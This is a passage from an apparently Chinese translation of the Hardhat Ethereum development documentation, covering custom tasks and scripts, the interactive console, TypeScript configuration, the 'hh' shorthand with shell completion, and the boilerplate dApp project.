尚未索引您的合约。在这种情况下，请稍等片刻，然后重试。</p></blockquote><p>任务成功执行后，您将看到一个指向已公开验证的合约代码的链接。</p><p>要了解有关验证(verifying)的更多信息，请阅读 <a href="https://hardhat.org/hardhat-runner/plugins/nomiclabs-hardhat-etherscan">hardhat-etherscan(plugin)</a> 文档。</p><h2 id="8-编写任务和脚本"><a href="#8-编写任务和脚本" class="headerlink" title="8. 编写任务和脚本"></a>8. 编写任务和脚本</h2><p>Hardhat 的核心是一个任务运行器(task runner)，可以让您自动化您的开发工作流程。它带有一些内置任务，例如 <code>compile</code> 和 <code>test</code>，但您也可以添加自己的自定义任务。</p><blockquote><p>译者认为，Hardhat task 的理念和使用有些类似于 GNU Make，可以对照了解和学习。<a href="https://www.gnu.org/software/make/manual/html_node/index.html">该网站</a>给出了 GNU make 的官网手册。</p></blockquote><p>本小节将向您展示如何使用任务和脚本扩展 Hardhat 的功能，并假定您已经初始化了一个示例项目。</p><h3 id="编写-Hardhat-任务"><a href="#编写-Hardhat-任务" class="headerlink" title="编写 Hardhat 任务"></a>编写 Hardhat 任务</h3><p>让我们编写一个打印可用帐户列表的非常简单的任务，并探索它是如何工作的。</p><p>复制此任务定义并将其粘贴到您的 Hardhat 配置文件中：</p><figure><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">task</span><span class="token punctuation">(</span><span class="token string">"accounts"</span><span class="token punctuation">,</span> <span class="token string">"Prints the list of accounts"</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">taskArgs<span class="token punctuation">,</span> hre</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> accounts <span class="token operator">=</span> <span class="token keyword">await</span> hre<span class="token punctuation">.</span>ethers<span class="token punctuation">.</span><span class="token function">getSigners</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> account <span class="token keyword">of</span> accounts<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>account<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>现在可以运行它：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">npx hardhat accounts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>我们正在使用 <code>task</code> 函数来定义我们的新任务。它的第一个参数是任务的名称，它是我们在命令行中用来运行它的名称。第二个参数是任务的描述，当你使用 <code>npx hardhat help</code> 时会打印出来。</p><p>第三个参数是运行任务时执行的异步函数。它接收两个参数：</p><ol><li>带有任务参数的对象，此处我们还没有定义。</li><li><a href="https://hardhat.org/hardhat-runner/docs/advanced/hardhat-runtime-environment">Hardhat Runtime Environment</a> 或 HRE，它包含 Hardhat 及其插件的所有功能。您还可以在任务执行期间找到注入到 <code>global</code> 命名空间中的所有属性。</li></ol><p>您可以在此功能中自由地做任何您想做的事情。在本例中，我们使用 <code>ethers.getSigners()</code> 来获取所有配置的帐户并打印它们的每个地址。</p><p>您可以添加参数到您的任务中，Hardhat 将会处理它们的解析(parsing)和验证(validation)。</p><p>您还可以覆盖现有任务，这允许您更改 Hardhat 不同部分的工作方式。</p><p>要了解有关任务的更多信息，请阅读 <a href="https://hardhat.org/hardhat-runner/docs/advanced/create-task">Creating a task</a>。</p><h3 id="编写-Hardhat-脚本"><a href="#编写-Hardhat-脚本" class="headerlink" title="编写 Hardhat 脚本"></a>编写 Hardhat 脚本</h3><p>您可以编写脚本并使用 Hardhat 运行它们。它们可以利用 <a href="https://hardhat.org/hardhat-runner/docs/advanced/hardhat-runtime-environment">Hardhat 运行时环境</a> 来访问所有 Hardhat 的功能，包括任务运行器(task runner)。</p><p>这是一个与我们的 <code>accounts</code> 任务相同的脚本。使用以下内容创建一个 <code>accounts.js</code> 文件：</p><figure><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> accounts <span class="token operator">=</span> <span class="token keyword">await</span> ethers<span class="token punctuation">.</span><span class="token function">getSigners</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> account <span class="token keyword">of</span> accounts<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>account<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">error</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span>    process<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>使用内置的 <code>run</code> 任务来运行它：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">npx hardhat run accounts.js<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>请注意，我们使用的是 <code>ethers</code> 而没有导入它。这是可能的，因为在 Hardhat 运行时环境中可用的所有内容在脚本中也是全局可用的。<code>ethers</code> 对象已经由 hardhat-toolbox 插件注入到了 Hardhat 运行时环境中。</p><p>要了解有关脚本的更多信息，包括如何在不使用 Hardhat 的 CLI 的情况下运行它们，请阅读 <a href="https://hardhat.org/hardhat-runner/docs/advanced/scripts">Writing scripts with Hardhat</a>。</p><h3 id="在任务和脚本之间选择"><a href="#在任务和脚本之间选择" class="headerlink" title="在任务和脚本之间选择"></a>在任务和脚本之间选择</h3><p>在任务和脚本之间进行选择取决于您。如果您不确定应该使用哪一个，下面的建议可能会有用：</p><ol><li>如果您想自动化不需要参数的工作流程，脚本可能是最佳选择。</li><li>如果您要自动化的工作流程需要一些参数，请考虑创建 Hardhat 任务。</li><li>如果您需要从另一个拥有自己 CLI 的工具访问 Hardhat Runtime Enivronment，例如 <a href="https://jestjs.io/"><code>jest</code></a> 或 <a href="https://www.npmjs.com/package/ndb"><code>ndb</code></a>，你应该写一个脚本。确保显式导入 Hardhat 运行时环境，以便<a href="https://hardhat.org/hardhat-runner/docs/advanced/scripts#standalone-scripts:-using-hardhat-as-a-library">可以使用该工具而不是 Hardhat 的 CLI 运行它</a>。</li><li>如果你觉得 Hardhat 的参数处理不能满足你的需要，你应该写一个脚本。只需显式导入 Hardhat 运行时环境，使用您自己的参数解析逻辑(例如使用 <a href="https://yargs.js.org/"><code>yargs</code></a>)，并<a href="https://hardhat.org/hardhat-runner/docs/advanced/scripts#standalone-scripts:-using-hardhat-as-a-library">将其作为独立的 Node.js 脚本运行</a>。</li></ol><h2 id="9-使用-Hardhat-控制台"><a href="#9-使用-Hardhat-控制台" class="headerlink" title="9. 使用 Hardhat 控制台"></a>9. 使用 Hardhat 控制台</h2><p>Hardhat 有内置的交互式 JavaScript 控制台。你可以通过运行 <code>npx hardhat console</code> 来使用它：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ npx hardhat consoleWelcome to Node.js v12.10.0.Type <span class="token string">".help"</span> <span class="token keyword">for</span> <span class="token function">more</span> information.<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p><code>compile</code> 任务将会在打开 console prompt 之前被调用，但是你可以通过 <code>--no-compile</code> 参数跳过。</p><p>控制台的执行环境和任务、脚本以及测试的相同。这意味着配置已经处理完毕，<a href="https://hardhat.org/hardhat-runner/docs/advanced/hardhat-runtime-environment">Hardhat 运行时环境</a>已经初始化并注入到全局作用域中。</p><p>例如，你将可以在全局范围内访问 <code>config</code> 对象：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> config<span class="token punctuation">&#123;</span>  solidity: <span class="token punctuation">&#123;</span> compilers: <span class="token punctuation">[</span> <span class="token punctuation">[</span>Object<span class="token punctuation">]</span> <span class="token punctuation">]</span>, overrides: <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span>,  defaultNetwork: <span class="token string">'hardhat'</span>,  <span class="token punctuation">..</span>.<span class="token punctuation">&#125;</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>而且如果你是从上面的教程跟下来的或安装了 <code>@nomiclabs/hardhat-ethers</code> ，那么也可以访问 <code>ethers</code> 对象：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> ethers<span class="token punctuation">&#123;</span>  Signer: <span class="token punctuation">[</span>Function: Signer<span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> isSigner: <span class="token punctuation">[</span>Function<span class="token punctuation">]</span> <span class="token punctuation">&#125;</span>,  <span class="token punctuation">..</span>.  provider: EthersProviderWrapper <span class="token punctuation">&#123;</span>  <span class="token punctuation">..</span>.  <span class="token punctuation">&#125;</span>,  <span class="token punctuation">..</span>.  getSigners: <span class="token punctuation">[</span>Function: getSigners<span class="token punctuation">]</span>,  <span class="token punctuation">..</span>.  getContractAt: <span class="token punctuation">[</span>Function: bound getContractAt<span class="token punctuation">]</span> AsyncFunction<span class="token punctuation">&#125;</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>任何注入到 <a href="https://hardhat.org/hardhat-runner/docs/advanced/hardhat-runtime-environment">Hardhat 运行时环境</a>中的都将神奇地在全局范围内可用。</p><p>或者，如果您是更明确的开发人员，则可以改为明确要求 HRE：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> const hre <span class="token operator">=</span> require<span class="token punctuation">(</span><span class="token string">"hardhat"</span><span class="token punctuation">)</span><span class="token operator">></span> hre.ethers<span class="token punctuation">&#123;</span>  Signer: <span class="token punctuation">[</span>Function: Signer<span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> isSigner: <span class="token punctuation">[</span>Function<span class="token punctuation">]</span> <span class="token punctuation">&#125;</span>,  <span class="token punctuation">..</span>.  provider: EthersProviderWrapper <span class="token punctuation">&#123;</span>  <span class="token punctuation">..</span>.  <span class="token punctuation">&#125;</span>,  <span class="token punctuation">..</span>.  getSigners: <span class="token punctuation">[</span>Function: getSigners<span class="token punctuation">]</span>,  <span class="token punctuation">..</span>.  getContractAt: <span class="token punctuation">[</span>Function: bound getContractAt<span class="token punctuation">]</span> AsyncFunction<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="历史"><a href="#历史" class="headerlink" title="历史"></a>历史</h3><p>您还会注意到控制台具有大多数交互式终端所期望的便捷历史记录功能，包括跨不同会话。您可以按向上箭头键尝试。 Hardhat 控制台只是 Node.js 控制台的一个实例，因此您可以使用在 Node.js 中使用的任何东西。</p><h3 id="异步操作和-top-level-await"><a href="#异步操作和-top-level-await" class="headerlink" title="异步操作和 top-level await"></a>异步操作和 top-level await</h3><p>与以太坊网络交互，也即与你的智能合约交互，是异步操作(asynchronous operations)。因此，大多数 API 和库使用 JavaScript 的 <code>Promise</code> 来返回值。</p><p>为了使事情更加简单，Hardhat 的控制台支持 top-level <code>await</code> 语句（例如 <code>console.log(await ethers.getSigners()</code>）。</p><h2 id="10-使用-TypeScript"><a href="#10-使用-TypeScript" class="headerlink" title="10. 使用 TypeScript"></a>10. 使用 TypeScript</h2><p>在本教程中，我们将逐步完成使用 TypeScript 的 Hardhat 项目。这意味着您可以在 <a href="https://www.typescriptlang.org/">TypeScript</a> 中编写 Hardhat 配置、任务、脚本和测试。</p><h3 id="启用-TypeScript-支持"><a href="#启用-TypeScript-支持" class="headerlink" title="启用 TypeScript 支持"></a>启用 TypeScript 支持</h3><p>如果您的配置文件以 <code>.ts</code> 结尾并且是使用有效的 TypeScript 编写的，那么 Hardhat 会自动地启用其 TypeScript 支持。这需要进行一些更改才能正常工作。</p><h4 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h4><blockquote><p>TIP：如果您使用 npm 7 或更高版本安装了 <a href="https://hardhat.org/hardhat-runner/plugins/nomicfoundation-hardhat-toolbox"><code>@nomicfoundation/hardhat-toolbox</code></a>，那么您将不需要执行下面几步。</p></blockquote><p>Hardhat 在引擎盖(hood)下面使用 TypeScript 和 <code>ts-node</code>，因此您需要安装它们。您需要打开终端，进入 Hardhat 项目，并且运行</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># npm 7+</span><span class="token function">npm</span> <span class="token function">install</span> --save-dev ts-node typescript<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>为了能够在 TypeScript 中编写测试，你还需要这些包：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># npm 7+</span><span class="token function">npm</span> <span class="token function">install</span> --save-dev chai @types/node @types/mocha @types/chai<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><h4 id="TypeScript-配置"><a href="#TypeScript-配置" class="headerlink" title="TypeScript 配置"></a>TypeScript 配置</h4><p>您可以轻松地将 JavaScript Hardhat 配置文件转换为 TypeScript 配置文件。让我们从一个新的 Hardhat 项目开始看看这是如何完成的。</p><p>打开您的终端，转到一个空文件夹，运行 <code>npx hardhat</code>，然后完成创建 JavaScript 项目的步骤。完成后，您的项目目录应如下所示：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">ls</span> -ltotal <span class="token number">1200</span>drwxr-xr-x    <span class="token number">3</span> pato  wheel      <span class="token number">96</span> Oct <span class="token number">20</span> <span class="token number">12</span>:50 contracts/-rw-r--r--    <span class="token number">1</span> pato  wheel     <span class="token number">567</span> Oct <span class="token number">20</span> <span class="token number">12</span>:50 hardhat.config.jsdrwxr-xr-x  <span class="token number">434</span> pato  wheel   <span class="token number">13888</span> Oct <span class="token number">20</span> <span class="token number">12</span>:52 node_modules/-rw-r--r--    <span class="token number">1</span> pato  wheel  <span class="token number">604835</span> Oct <span class="token number">20</span> <span class="token number">12</span>:52 package-lock.json-rw-r--r--    <span class="token number">1</span> pato  wheel     <span class="token number">460</span> Oct <span class="token number">20</span> <span class="token number">12</span>:52 package.jsondrwxr-xr-x    <span class="token number">3</span> pato  wheel      <span class="token number">96</span> Oct <span class="token number">20</span> <span class="token number">12</span>:50 scripts/drwxr-xr-x    <span class="token number">3</span> pato  wheel      <span class="token number">96</span> Oct <span class="token number">20</span> <span class="token number">12</span>:50 test/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>然后，您应该按照上面 【安装依赖】部分中提到的步骤进行操作。</p><p>下面，我们会将配置文件从 <code>hardhat.config.js</code> 重命名为 <code>hardhat.config.ts</code>，只需要运行：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mv</span> hardhat.config.js hardhat.config.ts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>我们需要对您的配置进行单一更改，以便与 Typescript 一起使用：您必须使用 <code>import</code>&#x2F;<code>export</code> 而不是<code>require</code>&#x2F;<code>module.exports</code>。</p><p>通过使用 TypeScript，您还可以键入您的配置，这将使您免于拼写错误和其他错误。</p><p>例如，相同的项目配置需要从这样：</p><figure><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"@nomicfoundation/hardhat-toolbox"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/** @type import('hardhat/config').HardhatUserConfig */</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token literal-property property">solidity</span><span class="token operator">:</span> <span class="token string">"0.8.9"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>更改为：</p><figure><div class="code-wrapper"><pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript"><span class="token keyword">import</span> <span class="token punctuation">&#123;</span> HardhatUserConfig <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">"hardhat/config"</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"@nomicfoundation/hardhat-toolbox"</span><span class="token punctuation">;</span><span class="token keyword">const</span> config<span class="token operator">:</span> HardhatUserConfig <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  solidity<span class="token operator">:</span> <span class="token string">"0.8.9"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">export</span> <span class="token keyword">default</span> config<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>最终，你需要创建一个 <code>tsconfig.json</code> 文件。这里是我们推荐的一个：</p><figure><div class="code-wrapper"><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"compilerOptions"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"target"</span><span class="token operator">:</span> <span class="token string">"es2020"</span><span class="token punctuation">,</span>    <span class="token property">"module"</span><span class="token operator">:</span> <span class="token string">"commonjs"</span><span class="token punctuation">,</span>    <span class="token property">"esModuleInterop"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token property">"forceConsistentCasingInFileNames"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token property">"strict"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token property">"skipLibCheck"</span><span class="token operator">:</span> <span class="token boolean">true</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>这就是它需要的所有了。现在您可以在 TypeScript 中编写配置、测试、任务和脚本。</p><h3 id="对项目进行类型检查"><a href="#对项目进行类型检查" class="headerlink" title="对项目进行类型检查"></a>对项目进行类型检查</h3><p>出于性能原因，Hardhat 不会在您运行任务时对您的项目进行类型检查。您可以使用 <code>--typecheck</code> 标志显式启用类型检查。</p><p>例如，如果您运行 <code>npx hardhat test</code> 并且您的测试有一个有编译错误，测试任务无论如何都会执行。但是如果您运行 <code>npm hardhat test --typecheck</code>，Hardhat 将会在开始运行测试前检测并抛出编译错误。</p><p>由于类型检查会增加大量开销，因此我们建议仅在 CI 或 pre-commit&#x2F;pre-push 钩子中进行。</p><h3 id="使用-TypeScript-编写测试和脚本"><a href="#使用-TypeScript-编写测试和脚本" class="headerlink" title="使用 TypeScript 编写测试和脚本"></a>使用 TypeScript 编写测试和脚本</h3><p>使用 JavaScript 时，<a href="https://hardhat.org/hardhat-runner/docs/advanced/hardhat-runtime-environment">Hardhat 运行时环境</a>中的所有属性都被注入到全局范围内。使用 TypeScript 时，全局范围内没有任何内容可用，您需要使用类似 <code>import &#123; ethers &#125; from &quot;hardhat&quot;</code> 的方式显式导入所有内容。</p><h3 id="类型安全的智能合约交互"><a href="#类型安全的智能合约交互" class="headerlink" title="类型安全的智能合约交互"></a>类型安全的智能合约交互</h3><blockquote><p>TIP：如果你安装了 <a href="https://hardhat.org/hardhat-runner/plugins/nomicfoundation-hardhat-toolbox">@nomicfoundation&#x2F;hardhat-toolbox</a> 你可以跳过这小节，因为它包含了 <a href="https://github.com/ethereum-ts/TypeChain/tree/master/packages/hardhat">@typechain&#x2F;hardhat</a>。</p></blockquote><p>如果你希望 Hardhat 为您的合约生成类型，你应该安装和使用 <a href="https://github.com/ethereum-ts/TypeChain/tree/master/packages/hardhat">@typechain&#x2F;hardhat</a>。它基于 ABI 生成了类型文件(<code>*.d.ts</code>)，并且它几乎不需要配置。</p><h3 id="支持路径映射"><a href="#支持路径映射" class="headerlink" title="支持路径映射"></a>支持路径映射</h3><p>TypeScript 支持通过 <a href="https://www.typescriptlang.org/tsconfig#paths"><code>paths</code></a> 配置选项来定义常规的<a href="https://www.typescriptlang.org/docs/handbook/module-resolution.html#path-mapping">路径映射(path mapping)</a>。</p><figure><div class="code-wrapper"><pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript"><span class="token punctuation">&#123;</span>  compilerOptions<span class="token operator">:</span> <span class="token punctuation">&#123;</span>    paths<span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token string-property property">"~/*"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"src/*"</span><span class="token punctuation">]</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token comment">// ...Other compilerOptions</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>要在运行 Hardhat 测试或脚本时支持此选项，您需要安装该软件包 <a href="https://www.npmjs.com/package/tsconfig-paths"><code>tsconfig-paths</code></a> 并将其注册到您的 <code>hardhat.config.ts</code> 中：</p><figure><div class="code-wrapper"><pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript"><span class="token keyword">import</span> <span class="token punctuation">&#123;</span> HardhatUserConfig <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">"hardhat/config"</span><span class="token punctuation">;</span><span class="token comment">// This adds support for typescript paths mappings</span><span class="token keyword">import</span> <span class="token string">"tsconfig-paths/register"</span><span class="token punctuation">;</span><span class="token keyword">const</span> config<span class="token operator">:</span> HardhatUserConfig <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// Your type-safe config goes here</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">export</span> <span class="token keyword">default</span> config<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="直接通过-ts-node-运行测试和脚本"><a href="#直接通过-ts-node-运行测试和脚本" class="headerlink" title="直接通过 ts-node 运行测试和脚本"></a>直接通过 <code>ts-node</code> 运行测试和脚本</h3><p>在没有 CLI 的情况下运行 Hardhat 脚本时，您需要使用 <code>ts-node</code> 的 <a href="https://www.npmjs.com/package/ts-node#help-my-types-are-missing"><code>--files</code></a> flag。</p><p>这也可以通过 <code>TS_NODE_FILES=true</code> 启用。</p><h2 id="11-命令行补充"><a href="#11-命令行补充" class="headerlink" title="11. 命令行补充"></a>11. 命令行补充</h2><p>Hardhat 有一个配套的 npm 包，它充当 <code>npx hardhat</code> 的简写，同时，它可以在您的终端中启用命令行完成。</p><p>这个包，<code>hardhat-shorthand</code>，安装了一个名为 <code>hh</code> 的全局可访问的二进制文件，它运行你本地安装的 <code>hardhat</code>。</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>要使用 Hardhat shorthand，您需要在**全局范围内(globally)**安装它：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> --global hardhat-shorthand<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>执行此操作后，运行 <code>hh</code> 将等同于运行 <code>npx hardhat</code>。例如，您可以运行 <code>hh compile</code>，而不是运行 <code>npx hardhat compile</code>。</p><h4 id="安装命令行补全"><a href="#安装命令行补全" class="headerlink" title="安装命令行补全"></a>安装命令行补全</h4><p>要启用自动补全(autocomplete)支持，您还需要使用 <code>hardhat-completion</code> 安装 shell 补全脚本，它附带 <code>hardhat-shorthand</code>。运行 <code>hardhat-completion install</code> 并按照说明安装补全脚本：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hardhat-completion <span class="token function">install</span>✔ Which Shell <span class="token keyword">do</span> you use ? · <span class="token function">zsh</span>✔ We will <span class="token function">install</span> completion to ~/.zshrc, is it ok ? <span class="token punctuation">(</span>y/N<span class="token punctuation">)</span> · <span class="token boolean">true</span><span class="token operator">=</span><span class="token operator">></span> Added tabtab <span class="token builtin class-name">source</span> line <span class="token keyword">in</span> <span class="token string">"~/.zshrc"</span> <span class="token function">file</span><span class="token operator">=</span><span class="token operator">></span> Added tabtab <span class="token builtin class-name">source</span> line <span class="token keyword">in</span> <span class="token string">"~/.config/tabtab/zsh/__tabtab.zsh"</span> <span class="token function">file</span><span class="token operator">=</span><span class="token operator">></span> Wrote completion script to /home/fvictorio/.config/tabtab/zsh/hh.zsh <span class="token function">file</span>      <span class="token operator">=</span><span class="token operator">></span> Tabtab <span class="token builtin class-name">source</span> line added to ~/.zshrc <span class="token keyword">for</span> hh package.      Make sure to reload your <span class="token environment constant">SHELL</span><span class="token builtin class-name">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>要试用它，请打开一个新终端，转到您的 Hardhat 项目的目录，然后尝试键入 <code>hh</code>，然后键入 tab，即可看到命令行补全效果。</p><h3 id="Context"><a href="#Context" class="headerlink" title="Context"></a>Context</h3><p>出于最佳实践，Hardhat 项目使用 npm 包 <code>hardhat</code> 的本地安装来确保参与该项目的每个人都使用相同的版本。这就是为什么您需要使用 <code>npx</code> 或 npm 脚本来运行 Hardhat。</p><p>这种方法的缺点是无法直接为 <code>hardhat</code> 命令提供自动补全建议，并且会使 CLI 命令更长。这是 <code>hh</code> 解决的两个问题。</p><h3 id="故障排除"><a href="#故障排除" class="headerlink" title="故障排除"></a>故障排除</h3><h4 id="“Autocompletion-is-not-working”"><a href="#“Autocompletion-is-not-working”" class="headerlink" title="“Autocompletion is not working”"></a>“Autocompletion is not working”</h4><p>首先，确保您使用 <code>hardhat-completion install</code> 安装了自动补全脚本，然后重新加载您的 shell 或打开一个新终端重试。</p><p>如果仍有问题，请确保您的 Hardhat 配置没有任何问题。你可以通过运行 <code>hh</code> 来做到这一点。如果命令行打印帮助消息，那么您的配置是可以的。如果没有，您将看到问题是什么。</p><h2 id="12-模板工程"><a href="#12-模板工程" class="headerlink" title="12. 模板工程"></a>12. 模板工程</h2><p>如果您想快速开始使用您的 dApp 或使用前端查看整个项目的外观，您可以使用我们的<a href="https://github.com/NomicFoundation/hardhat-boilerplate">样板代码库</a>。</p><h3 id="包含了什么"><a href="#包含了什么" class="headerlink" title="包含了什么"></a>包含了什么</h3><ul><li>我们在本教程中使用的 Solidity 合约</li><li>合约全部功能的测试</li><li>使用 ethers.js 和合约交互的最小 React 前端</li></ul><h4 id="Solidity-合约-amp-测试"><a href="#Solidity-合约-amp-测试" class="headerlink" title="Solidity 合约 &amp; 测试"></a>Solidity 合约 &amp; 测试</h4><p>在 repo 的根目录中，您将找到我们通过本教程与 <code>Token</code> 合约一起构建的 Hardhat 项目。该项目实现了：</p><ul><li>代币的总供应量是固定的，无法更改。</li><li>整个供应分配到部署合约的地址。</li><li>任何人都可以收到代币。</li><li>任何拥有至少一个代币的人都可以转移代币。</li><li>令牌是不可分割的。您可以转移 1、2、3 或 37 个代币，但不能转移 2.5 个。</li></ul><h4 id="前端应用"><a href="#前端应用" class="headerlink" title="前端应用"></a>前端应用</h4><p>在前端(<code>frontend</code>)，你会发现一个简单的应用程序，它允许用户做两件事：</p><ul><li>检查已连接钱包的余额</li><li>将代币发送到一个地址</li></ul><p>它是一个单独的 npm 项目，它是使用 <code>create-react-app</code> 创建的，所以这意味着它使用了 webpack 和 babel。</p><h4 id="前端文件结构"><a href="#前端文件结构" class="headerlink" title="前端文件结构"></a>前端文件结构</h4><ul><li><code>src/</code> 包含了所有的代码<ul><li><code>src/components</code> 包含了 react 组件<ul><li><code>Dapp.js</code> 